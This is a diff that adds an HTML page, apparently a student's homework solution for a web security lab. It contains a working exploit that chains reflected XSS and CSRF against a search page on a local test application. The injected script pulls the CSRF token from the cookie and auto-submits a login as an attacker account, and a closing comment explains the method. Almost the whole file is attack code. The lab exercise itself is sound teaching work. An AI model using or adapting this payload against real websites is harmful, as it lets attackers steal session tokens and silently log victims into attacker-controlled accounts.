@@ -1,0 +1,51 @@
+<html>
+<body>
+<script>
+// Clear webpage
+document.body.innerHTML = ''; 
+
+// This is the payload that'll be inserted to the searchbox to extract CSRF token.
+var xssPayload = `<img src=x onerror="
+    var token = document.cookie.match(/csrf=([^;]+)/)[1];
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.action = './login';
+    form.innerHTML = '<input name=username value=attacker><input name=password value=badguy4><input name=csrf value=' + token + '>';
+    document.body.appendChild(form);
+    form.submit();
+">`;
+
+// Redirect to search page & insert payload
+var form = document.createElement('form');
+form.method = 'GET';
+form.action = 'http://localhost/project2/search';
+var qInput = document.createElement('input');
+qInput.name = 'q';
+qInput.value = xssPayload;
+form.appendChild(qInput);
+
+// setting up the def params
+var csrfDefense = document.createElement('input');
+csrfDefense.name = 'csrfdefense';
+csrfDefense.value = '1';
+form.appendChild(csrfDefense);
+
+var xssDefense = document.createElement('input');
+xssDefense.name = 'xssdefense';
+xssDefense.value = '0';
+form.appendChild(xssDefense);
+
+// sumbit, victim will be redirected to attacker's login automatically.
+document.body.appendChild(form);
+form.submit();
+</script> 
+</body>
+</html>
+
+<!-- So the logic behind this was this, since the XSS was vunerable, I could simply just use the fact that I can run scripts 
+ within that "search" box to writeup a script to steal the cookie from the website and have it login the victim to the attacker's acct.
+
+References: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html,
+            PART 2 HW
+Collaborators: N/A
+-->
